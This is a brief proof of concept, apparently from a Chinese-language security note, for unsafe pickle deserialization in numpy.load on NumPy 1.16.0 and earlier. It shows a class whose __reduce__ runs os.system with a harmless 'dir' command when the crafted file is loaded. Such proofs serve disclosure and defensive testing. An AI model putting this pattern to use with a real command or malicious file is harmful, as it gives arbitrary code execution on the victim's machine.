(NumPy <=1.16.0)

```python
import numpy
import pickle

class genpoc(object):

	def __reduce__(self):
		import os
		s = """dir"""
		return os.system, (s,) 

e = genpoc()
flag=0
if flag:
	poc = pickle.dumps(e)
	print(poc)
else:
	with open('1.pkl', 'wb') as f:
	    pickle.dump(e, f)

numpy.load('1.pkl');
```

其实也是在numpy中使用了pickle.load函数的序列化